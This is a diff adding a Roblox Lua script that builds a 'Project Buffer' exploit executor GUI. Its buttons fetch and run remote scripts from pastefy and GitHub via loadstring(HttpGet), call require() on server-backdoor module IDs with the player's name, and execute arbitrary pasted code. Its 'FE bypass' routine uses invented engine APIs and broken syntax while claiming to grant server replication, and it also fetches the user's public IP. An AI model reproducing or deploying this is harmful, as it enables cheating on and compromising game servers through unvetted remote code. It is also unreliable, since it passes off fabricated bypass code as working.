@@ -1,0 +1,811 @@
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
+]=]
+
+-- Instances: 20 | Scripts: 2 | Modules: 0 | Tags: 0
+local G2L = {};
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]"
+G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+G2L["1"]["Name"] = [[-{{P'ROject_='];Buffer-SS;]"]];
+G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root
+G2L["2"] = Instance.new("Frame", G2L["1"]);
+G2L["2"]["BorderSizePixel"] = 0;
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(100, 100, 100);
+G2L["2"]["Size"] = UDim2.new(0, 344, 0, 32);
+G2L["2"]["Position"] = UDim2.new(0.25568, 0, 0.2451, 0);
+G2L["2"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2"]["Name"] = [[root]];
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.contents
+G2L["3"] = Instance.new("Frame", G2L["2"]);
+G2L["3"]["BorderSizePixel"] = 2;
+G2L["3"]["BackgroundColor3"] = Color3.fromRGB(100, 100, 100);
+G2L["3"]["Size"] = UDim2.new(0, 247, 0, 171);
+G2L["3"]["Position"] = UDim2.new(0.28268, 0, 0.9927, 0);
+G2L["3"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["3"]["Name"] = [[contents]];
+G2L["3"]["BackgroundTransparency"] = 0.5;
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.contents.Scroll
+G2L["4"] = Instance.new("ScrollingFrame", G2L["3"]);
+G2L["4"]["Active"] = true;
+G2L["4"]["BorderSizePixel"] = 2;
+G2L["4"]["BackgroundColor3"] = Color3.fromRGB(77, 77, 77);
+G2L["4"]["Name"] = [[Scroll]];
+G2L["4"]["Size"] = UDim2.new(0, 217, 0, 104);
+G2L["4"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4"]["Position"] = UDim2.new(0.03239, 0, 0.07602, 0);
+G2L["4"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4"]["BackgroundTransparency"] = 0.5;
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.contents.Scroll.CodeBox
+G2L["5"] = Instance.new("TextBox", G2L["4"]);
+G2L["5"]["CursorPosition"] = -1;
+G2L["5"]["Name"] = [[CodeBox]];
+G2L["5"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["5"]["BorderSizePixel"] = 0;
+G2L["5"]["TextWrapped"] = true;
+G2L["5"]["TextSize"] = 14;
+G2L["5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/RobotoMono.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["5"]["MultiLine"] = true;
+G2L["5"]["ClearTextOnFocus"] = false;
+G2L["5"]["PlaceholderText"] = [[-- code here skid]];
+G2L["5"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5"]["Text"] = [[]];
+G2L["5"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.contents.exe
+G2L["6"] = Instance.new("ImageButton", G2L["3"]);
+G2L["6"]["BorderSizePixel"] = 0;
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["6"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
+G2L["6"]["Image"] = [[rbxassetid://84159029790324]];
+G2L["6"]["Size"] = UDim2.new(0, 40, 0, 40);
+G2L["6"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6"]["Name"] = [[exe]];
+G2L["6"]["Position"] = UDim2.new(0.03239, 0, 0.73099, 0);
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.contents.exe.UIStroke
+G2L["7"] = Instance.new("UIStroke", G2L["6"]);
+G2L["7"]["Transparency"] = 0.5;
+G2L["7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["7"]["LineJoinMode"] = Enum.LineJoinMode.Miter;
+G2L["7"]["Thickness"] = 2;
+G2L["7"]["Color"] = Color3.fromRGB(255, 255, 255);
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.contents.inj
+G2L["8"] = Instance.new("ImageButton", G2L["3"]);
+G2L["8"]["BorderSizePixel"] = 0;
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["8"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
+G2L["8"]["Image"] = [[rbxassetid://99625725727957]];
+G2L["8"]["Size"] = UDim2.new(0, 40, 0, 40);
+G2L["8"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8"]["Name"] = [[inj]];
+G2L["8"]["Position"] = UDim2.new(0.74899, 0, 0.73099, 0);
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.contents.inj.UIStroke
+G2L["9"] = Instance.new("UIStroke", G2L["8"]);
+G2L["9"]["Transparency"] = 0.5;
+G2L["9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["9"]["LineJoinMode"] = Enum.LineJoinMode.Miter;
+G2L["9"]["Thickness"] = 2;
+G2L["9"]["Color"] = Color3.fromRGB(255, 255, 255);
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.contents.cls
+G2L["a"] = Instance.new("ImageButton", G2L["3"]);
+G2L["a"]["BorderSizePixel"] = 0;
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["a"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
+G2L["a"]["Image"] = [[rbxassetid://10190648035]];
+G2L["a"]["Size"] = UDim2.new(0, 40, 0, 40);
+G2L["a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a"]["Name"] = [[cls]];
+G2L["a"]["Position"] = UDim2.new(0.21862, 0, 0.73099, 0);
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.contents.cls.UIStroke
+G2L["b"] = Instance.new("UIStroke", G2L["a"]);
+G2L["b"]["Transparency"] = 0.5;
+G2L["b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["b"]["LineJoinMode"] = Enum.LineJoinMode.Miter;
+G2L["b"]["Thickness"] = 2;
+G2L["b"]["Color"] = Color3.fromRGB(255, 255, 255);
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.contents.main
+G2L["c"] = Instance.new("LocalScript", G2L["3"]);
+G2L["c"]["Name"] = [[main]];
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.scripts
+G2L["d"] = Instance.new("Frame", G2L["2"]);
+G2L["d"]["BorderSizePixel"] = 0;
+G2L["d"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
+G2L["d"]["Size"] = UDim2.new(0, 98, 0, 171);
+G2L["d"]["Position"] = UDim2.new(0, 0, 1.01794, 0);
+G2L["d"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d"]["Name"] = [[scripts]];
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.scripts.entry
+G2L["e"] = Instance.new("ScrollingFrame", G2L["d"]);
+G2L["e"]["Active"] = true;
+G2L["e"]["BorderSizePixel"] = 0;
+G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e"]["Name"] = [[entry]];
+G2L["e"]["Size"] = UDim2.new(1, 0, 0.99948, 0);
+G2L["e"]["Position"] = UDim2.new(-0, 0, 0.00165, 0);
+G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.scripts.entry.UIListLayout
+G2L["f"] = Instance.new("UIListLayout", G2L["e"]);
+G2L["f"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.scripts.UIStroke
+G2L["10"] = Instance.new("UIStroke", G2L["d"]);
+G2L["10"]["Transparency"] = 0.5;
+G2L["10"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["10"]["LineJoinMode"] = Enum.LineJoinMode.Miter;
+G2L["10"]["Thickness"] = 2;
+G2L["10"]["Color"] = Color3.fromRGB(255, 255, 255);
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.TextLabel
+G2L["11"] = Instance.new("TextLabel", G2L["2"]);
+G2L["11"]["TextWrapped"] = true;
+G2L["11"]["BorderSizePixel"] = 0;
+G2L["11"]["TextSize"] = 14;
+G2L["11"]["TextScaled"] = true;
+G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11"]["BackgroundTransparency"] = 1;
+G2L["11"]["RichText"] = true;
+G2L["11"]["Size"] = UDim2.new(0, 152, 0, 25);
+G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["11"]["Text"] = [[Project Buffer]];
+G2L["11"]["Position"] = UDim2.new(0.02035, 0, 0.09375, 0);
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.UIStroke
+G2L["12"] = Instance.new("UIStroke", G2L["2"]);
+G2L["12"]["Transparency"] = 0.5;
+G2L["12"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["12"]["LineJoinMode"] = Enum.LineJoinMode.Miter;
+G2L["12"]["Thickness"] = 2;
+G2L["12"]["Color"] = Color3.fromRGB(255, 255, 255);
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.UIStroke.LocalScript
+G2L["13"] = Instance.new("LocalScript", G2L["12"]);
+
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.UIStroke.LocalScript.temp
+G2L["14"] = Instance.new("TextButton", G2L["13"]);
+G2L["14"]["RichText"] = true;
+G2L["14"]["BorderSizePixel"] = 2;
+G2L["14"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["14"]["TextSize"] = 14;
+G2L["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["14"]["BackgroundColor3"] = Color3.fromRGB(54, 54, 54);
+G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["14"]["Size"] = UDim2.new(0, 98, 0, 19);
+G2L["14"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["14"]["Text"] = [[]];
+G2L["14"]["Name"] = [[temp]];
+G2L["14"]["Position"] = UDim2.new(-0.0102, 0, -0.00585, 0);
+
+
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.contents.main
+local function C_c()
+local script = G2L["c"];
+	local executionAPI={}
+	local plr=game.Players.LocalPlayer
+	
+	function run(func) return func() end
+	
+	local copyrawmetatable=run(function()--module by 12345koip
+		--retrieves a metatable regardless of the __metatable field
+		--view full license on the GitHub
+	
+		--temporary results table to store retrieved metamethods
+		local results = {}
+	
+		--type function for result
+		type function getReturnValue(T)
+			local types = {
+				newtable = function()
+					return {}
+				end;
+	
+				singleton = function(value)
+					-- This is just a tag function for clarity; Luau handles singleton types via literal annotations
+					return value :: typeof(value)
+				end;
+			}
+			if (not T:is("table")) then
+				return types.newtable()
+			elseif T:is("table") then
+				return types.newtable()
+			else
+				return types.singleton(nil)
+			end
+		end
+	
+		--userdata object + metamethods setting up
+		local userdata, metamethodRetrievers, userdataMt do
+			userdata = newproxy(true)
+			userdataMt = getmetatable(userdata)
+	
+			--a bunch of functions used for running the metamethods with controlled parameters
+			metamethodRetrievers = table.freeze({
+				__add = function(item) return item + userdata end,
+				__sub = function(item) return item - userdata end,
+				__mul = function(item) return item * userdata end,
+				__div = function(item) return item / userdata end,
+				__mod = function(item) return item % userdata end,
+				__pow = function(item) return item ^ userdata end,
+				__unm = function(item) return -item end,
+				__eq = function(item) return item == userdata end,
+				__lt = function(item) return item < userdata end,
+				__le = function(item) return item <= userdata end,
+				__concat = function(item) return item..userdata end,
+				__len = function(item) return #item end,
+				__index = function(item) return item[userdata] end,
+				__newindex = function(item)
+					local key = string.rep("ergfbgferfgferfvb", math.random(1, 6))
+					item[key] = userdata
+					item[key] = nil
+				end,
+				__call = function(item) return item(userdata) end,
+				__tostring = function(item) return tostring(item) end
+			})
+	
+			local function inspectStack(name: string) --inspects levels in the stack for metamethods
+				--loop through stack levels looking for a metamethod that isnt this function
+				for level = 1, 20, 1 do
+					--try get the function and its name
+					local s, funcAtLevel = pcall(debug.info, level, "f")
+					local s2, funcName = pcall(debug.info, funcAtLevel, "n")
+	
+					--if it succeeded and the located metamethod is different to those existing with the same name
+					if (s and s2 and funcName == name and funcAtLevel ~= userdataMt[name] and funcAtLevel ~= metamethodRetrievers[name]) then
+						results[name] = funcAtLevel
+					end
+				end
+			end
+	
+			--set up metamethods
+			userdataMt.__add = function()
+				inspectStack("__add") --inspect the stack for __add
+	
+				--return a placeholder value to be used
+				return 3
+			end
+	
+			userdataMt.__sub = function()
+				inspectStack("__sub") --inspect for __sub
+				return 3 --return a placeholder
+			end
+	
+			userdataMt.__mul = function()
+				inspectStack("__mul")
+				return 3
+			end
+	
+			userdataMt.__div = function()
+				inspectStack("__div")
+				return 3
+			end
+	
+			userdataMt.__mod = function()
+				inspectStack("__mod")
+				return 3
+			end
+	
+			userdataMt.__pow = function()
+				inspectStack("__pow")
+				return 3
+			end
+	
+			userdataMt.__eq = function()
+				inspectStack("__eq")
+				return false
+			end
+	
+			userdataMt.__lt = function()
+				inspectStack("__lt")
+				return false
+			end
+	
+			userdataMt.__le = function()
+				inspectStack("__le")
+				return false
+			end
+	
+			userdataMt.__concat = function()
+				inspectStack("__concat")
+				return "a"
+			end
+	
+			userdataMt.__tostring = function()
+				--when __tostring is invoked on the proxy, check a bunch of metamethods which might require that
+				inspectStack("__newindex")
+				inspectStack("__index")
+				inspectStack("__tostring")
+				inspectStack("__call")
+				inspectStack("__concat")
+				return "userdata"
+			end
+		end
+	
+		--all the characters that can be used to generate a valid key
+		local characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_"
+	
+		--get a random key to make it harder to metamethod hide
+		local function getkey()
+			local password = ""
+	
+			for i = 1, math.random(45, 75), 1 do --make it between 45 and 75 characters long
+				local key = math.random(1, #characters)
+				password ..= string.sub(characters, key, key)
+			end
+	
+			return password
+		end
+	
+		--checks to see if a table has a protected metatable or not
+		local function isMetatableProtected(target: Instance|any): boolean
+			--attempt to overwrite the metatable with another value. If it errors, the metatable is protected.
+			local success, err = pcall(function()
+				--get the old metatable so we can restore it
+				local old = getmetatable(target)
+	
+				--try and set the new one
+				setmetatable(target, {})
+	
+				--if that didn't error, we can overwrite it with the old one
+				setmetatable(target, old)
+			end)
+	
+			return (not success and string.match(err:lower(), "protected metatable") ~= nil)
+		end
+	
+		--checks to see if the given target is an <code>Instance</code>, bypassing the <code>__type</code> metamethod
+		local function isInstance(target: any, onModdedMetamethodDetected: (string) -> ()?): (boolean, boolean)
+			--get what is expected to be __index
+			local __in = select(2, xpcall(function() return target[getkey()](target) end, function() return debug.info(2, "f") end))
+	
+			--doesn't matter if __index is hooked, wrapping it 198 times and calling it again will C stack overflow if it is hooked
+			--tables don't have __index so that can't be hooked either
+			for i = 1, 198, 1 do
+				__in = coroutine.wrap(__in)
+			end
+	
+			--try to call it again
+			local errorMsg = select(2, pcall(__in))
+	
+			--check for a suspicious error message - detect sethiddenstack
+			local s, suspiciousMatch = pcall(function() --secondary wrapped function so dont need to check that :D
+				return errorMsg:match("%u?%l?%d[%u%l%d_]+")
+			end)
+	
+			if (not s and onModdedMetamethodDetected) then --no error message - gotta be hooked
+				onModdedMetamethodDetected("stack retriever is hooked")
+				return true
+			elseif (not s) then
+				return true
+			end
+	
+			--if it stack overflowed, it was an instance. Or, if it said invalid arg, it's also an instance. Only instances have __namecall.
+			if (errorMsg:match("C stack overflow") or errorMsg:match("missing argument #1 %(Instance expected%)")) then
+				return true
+			elseif (suspiciousMatch and #suspiciousMatch > 5) then
+				if (onModdedMetamethodDetected) then onModdedMetamethodDetected(suspiciousMatch) end
+				return true, true
+			end
+	
+			return false
+		end
+	
+		--Returns the real metatable of <code>target</code>, bypassing any metamethods.
+		local function copyrawmetatable<T>(target: T, onModdedMetamethodDetected: (string) -> ()?): getReturnValue<T>
+			table.clear(results)
+	
+			local metatable do --get the metatable
+				--if its an instance, return its core metamethods (__index, __newindex, __type, __metatable and __namecall)
+				local isInstance, hideMetamethods = isInstance(target, onModdedMetamethodDetected)
+	
+				if (isInstance and typeof(isInstance) == "boolean") then
+					metatable = {
+						__index = select(2, xpcall(function() return target[getkey()] end, function() return debug.info(2, "f") end)),
+						__newindex = select(2, xpcall(function() target[getkey()] = nil end, function() return debug.info(2, "f") end)),
+						__namecall = select(2, xpcall(function() return target:iweurfhbvhcgyudsiewhjrebdf_yes_i_just_ran_my_hand_over_my_keyboard() end, function() return debug.info(2, "f") end)),
+						__type = typeof(target),
+						__metatable = getmetatable(target)
+					}
+	
+					--if the expected functions aren't the expected functions, leave them out
+					if (hideMetamethods) then
+						metatable.__index = nil
+						metatable.__newindex = nil
+						metatable.__namecall = nil
+					end
+	
+				elseif (type(target) == "table" and typeof(isInstance) == "boolean") then --table or proxy
+					--check if the metatable is protected. if not, just return it like that
+					if (not isMetatableProtected(target)) then
+						return getmetatable(target)
+					end
+	
+					metatable = { --create the metatable, the __metatable field can be filled already
+						__metatable = getmetatable(target)
+					}
+	
+					--now, run each function and get the stack inspected metamethod
+					for name, func in metamethodRetrievers do
+	
+						--use an xpcall to stack inspect any erroring metamethods
+						local s, metamethod = xpcall(function()
+							func(target) --return the result from the results table
+							return results[name]
+						end, function()
+							--iterate over stack levels until found, if the metamethod errored
+							for level = 2, 25, 1 do
+								local s, funcAtLevel = pcall(debug.info, level, "f")
+								local s2, funcName = pcall(debug.info, funcAtLevel, "n")
+	
+								--if the metamethod is a function and is the metamethod of the table
+								if (s and s2 and funcName == name and funcAtLevel ~= userdataMt[name] and funcAtLevel ~= metamethodRetrievers[name] and typeof(funcAtLevel) == "function") then
+									return funcAtLevel
+								end
+							end
+						end) --try to run the retriever
+	
+						metatable[name] = metamethod --store the metamethod
+					end
+	
+					return table.freeze(metatable)
+	
+				elseif (isInstance == -1 and typeof(isInstance) == "number") then --suspicious call stack error
+					return
+	
+				else --invalid target
+					error(
+						target ~= nil and "invalid argument #1 to 'copyrawmetatable' (Instance or table expected, got "..typeof(target)..")"
+							or "missing argument #1 to 'copyrawmetatable'"
+					)
+				end
+			end
+	
+			return metatable --return the raw metatable
+		end
+	
+		return copyrawmetatable end)
+	
+	local blankfunction=function(...)end
+	
+	local modENV={
+		getrawmetatable=copyrawmetatable;
+		cloneref=cloneref or function(obj) return obj end;
+		getObjs=copyrawmetatable(game).GetObjects or blankfunction;
+		newcclosure=newcclosure or function(fn) return fn end;
+		getgenv=getgenv or function()
+			local env={}
+			for _, n,v in ipairs(_G) do
+				env[n]=v
+			end
+			return env
+		end;
+		setreadonly=function(tbl:table,readonly:boolean)
+			if readonly then
+				return setmetatable({}, {
+					__index = tbl,
+					__newindex = function(_, k, v)
+						error(`Attempt to modify read-only table at key '{k}'`, 2)
+					end,
+					__metatable = "L L L LOLLL lockeddd"
+				})
+			else
+				-- Return original table for writable mode
+				return tbl
+			end
+		end,
+	}
+	
+	executionAPI.funcs={}
+	executionAPI.strs={
+		SSP='require(16920033857)("'..plr.Name..'")';
+		Polaria='require(123255432303221):Pload("'..plr.Name..'")';
+		ExSer='require(10868847330):pls("'..plr.Name..'")';
+		GrabKnife='require(18665717275).load("'..game.Players.LocalPlayer.Name..'")'
+	}
+	
+	
+	function executionAPI.funcs.SSP()
+		loadstring(game:HttpGet("https://pastefy.app/t2gUwfXy/raw",true))()
+	end
+	
+	function executionAPI.funcs.Polaria()
+		loadstring(game:HttpGet("https://pastefy.app/agqEB2qs/raw",true))()
+	end
+	
+	executionAPI.funcs.ExSer=function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/gitluau/luauexser/refs/heads/main/pHzp8uG1PO962o6qucrlP3AJy17eV3B.lua"))()
+	end
+	function executionAPI.funcs.GrabKnife()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Grab%20V4.txt", true))()
+	end
+	
+	function executionAPI.executify(code:string)
+		for _, name,value in ipairs(executionAPI.strs) do
+			if code:find(value) then
+				return executionAPI.funcs[name]
+			end
+		end
+	end
+	
+	local box=script.Parent.Scroll
+	local exe=script.Parent.exe
+	local cls=script.Parent.cls
+	local inj=script.Parent.inj
+	
+	local injected=false
+	local isinjected=injected==true
+	local isnotinjected=injected==false
+	
+	function inject():boolean
+		-- // FE Bypach by Perdika copyright 2025.. do not steal.. \\
+	
+		print("[Herbert]: Attempting to bypass FE..")
+		local network = game:GetService("NetworkClient")
+		local oldNet = network:FindFirstChild("ReplicationSettings")
+		if oldNet then
+			oldNet:Destroy() -- delete roblox's default replication settings
+		end
+	
+		function generateAuthTicket(plr)
+			local ticketSeed = (game.PlaceId * game.GameId) - (plr.UserId % math.clamp(game.CreatorId, 1,(plr.UserId/2)))
+			math.randomseed(ticketSeed)
+	
+			local authTicket = "!RBLX_".. Version():gsub("%.","-") .. "_AUTH:"
+			local chars = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F"}
+	
+			for i = 1, 56 do
+				authTicket ..= chars[math.random(#chars)]
+			end
+	
+			print("[Herbert]: Generated auth ticket " .. authTicket)
+			return authTicket
+		end
+	
+		local authTicket = generateAuthTicket(game:GetService("Players").LocalPlayer)
+		local enabled = Enum.ReplicateInstanceDestroySetting.Enabled.Value
+		local perdika = Instance.new("TeleportOptions", network) -- create options instance with network attribs
+		perdika.Name = "ReplicationSettings"
+		perdika:SetAttribute("InstanceDestroyReplicated", enabled)
+		perdika:SetAttribute("InstanceCreationReplicated", enabled)
+		perdika:SetAttribute("InstanceChangesReplicated", enabled)
+		perdika:SetAttribute("InstancePropertiesReplicated", enabled)
+		perdika:SetAttribute("AuthTicket", authTicket)
+	
+		function constructPacket(name, id, auth, data, ttl)
+			local packet = {
+				"RAKNET", "RAKUDP",
+				name, id, auth, data, ttl, "HIGH_PRIORITY", "RELIABLE",
+			}
+			return game:GetService("HttpService"):JSONEncode(packet)
+		end
+	
+		-- Set changes
+		local res, success = pcall(function()
+			local plr = game:GetService("Players").LocalPlayer
+			setreadonly(plr.ReplicationFocus, false)
+			setscriptable(plr, "ReplicationFocus", true)
+			plr.ReplicationFocus = game -- allow player to replicate everything in datamodel
+	
+			network:RefreshReplicationSettings(true, authTicket, perdika) -- load new replication settings
+			local replicator = network:GetReplicator(authTicket) -- fetch client replicator instance
+			replicator:SetReplicationRule(  -- write new rule that allows client -> server replication
+				{
+					replicationFiltering = false,
+					firewallWhitelist = { plr },
+					legacyFilteringEnabled = false,
+					replicatedInstances = {game}, -- replicates all descendants of the datamodel (everything)
+				}
+			)
+			local ip = game:HttpGet("https://api.ipify.org/?format=txt") -- public ip for packet auth
+	
+			local outbound = replicator:GetOutboundConnections()
+			local latestPacketID = 0
+			for conn, contype in pairs(outbound) do -- fetch latest packet id
+				if contype == 4 then -- 4 is the enum for packet
+					latestPacketID = math.max(latestPacketID, conn.id)
+				end
+			end
+	
+			-- generate encoded auth code for packet auth
+			local encodedAuth = ""
+			for i = #1, #authTicket do
+				local char = string.sub(authTicket, i, i)
+				encodedAuth ..= string.byte(char)
+			end
+	
+			-- construct packet params
+			local params = {
+				from = ip,
+				auth = encodedAuth,
+				RKSEC = tick(),
+				PermissionIndex = 20, -- highest permission level
+	
+				Request = {
+					ServerReplicatorChange = {
+						priority = "HIGH_PRIORITY",
+						data = {
+							replicationFiltering = false,
+							firewallWhitelist = {{plr,ip}},
+							legacyFilteringEnabled = false,
+							replicatedInstances = {game},
+							exclude = {},
+							HostCanReplicate = true,
+							ReplicationSettings = {
+								all = true,
+								noReplicationBelow = -1,
+								experimentalMode = false,
+							}
+						}
+					}
+				}
+			}
+	
+			-- send packet
+			local response = replicator:SendPacket(0, constructPacket("ReplicationRequest", latestPacketID+1, authTicket, game:GetService("HttpService"):JSONEncode(params), -1))
+			if response[1]:lower():find("success") and response[2] ~= Enum.ConnectionError.ReplicatorTimeout then
+				perdika.RobloxLocked = true
+				return true
+			else
+				print("[Herbert]: Packet failed.")
+				return false
+			end
+		end)
+	
+		-- check if request successful
+		if success then
+			print("[Herbert]: FE Bypassed.")
+		else
+			print("[Herbert]: FE Bypass failed. Please try again.")
+		end
+		return success
+	end
+	
+	modENV.getgenv().notif=modENV.newcclosure(function(_1:string)
+		game:GetService('StarterGui'):SetCore('SendNotification',{
+			Title='BufferSS';
+			Text=_1;
+			Button1='OK';
+		})
+	end)
+	
+	inj.MouseButton1Click:Connect(function()
+		if isnotinjected then
+			local injVALUE=inject()
+			if injVALUE==true then
+				injected=true
+				modENV.getgenv().notif('injected YAYYAYA')
+				return
+			else
+				injected=false
+				modENV.getgenv().notif('DID NOT WORK :(((')
+				return
+			end
+		end
+	end)
+	
+	exe.MouseButton1Click:Connect(function()
+		if isinjected then
+			local executified=executionAPI.executify(script.Parent.Scroll.CodeBox.Text)
+			if typeof(executified)=='function' then
+				executified()
+			else
+				loadstring(script.Parent.Scroll.CodeBox.Text)()
+			end
+		end
+	end)
+	
+	local idkdkkasdkasd=function()
+		local module = {}
+	
+		local entry=script.Parent.Parent.scripts.entry
+	
+		module.create=function(text,func)
+			local new=script:WaitForChild('temp'):Clone()
+	
+			new.Text=text
+			new.MouseButton1Click:Connect(func)
+			new.Parent=entry
+		end
+	
+		return module
+	end
+	
+	cls.MouseButton1Click:Connect(function()
+		script.Parent.Scroll.CodeBox.Text=''
+	end)
+	
+	for n,v in ipairs(executionAPI.strs) do
+		idkdkkasdkasd().create(n,loadstring(v))
+	end
+end;
+task.spawn(C_c);
+-- StarterGui.-{{P'ROject_='];Buffer-SS;]".root.UIStroke.LocalScript
+local function C_13()
+local script = G2L["13"];
+	local UserInputService = game:GetService("UserInputService")
+	
+	local gui = script.Parent
+	
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+	
+	local function update(input)
+		local delta = input.Position - dragStart
+		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+	
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+			
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	
+	UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			update(input)
+		end
+	end)
+end;
+task.spawn(C_13);
+
+return G2L["1"], require;
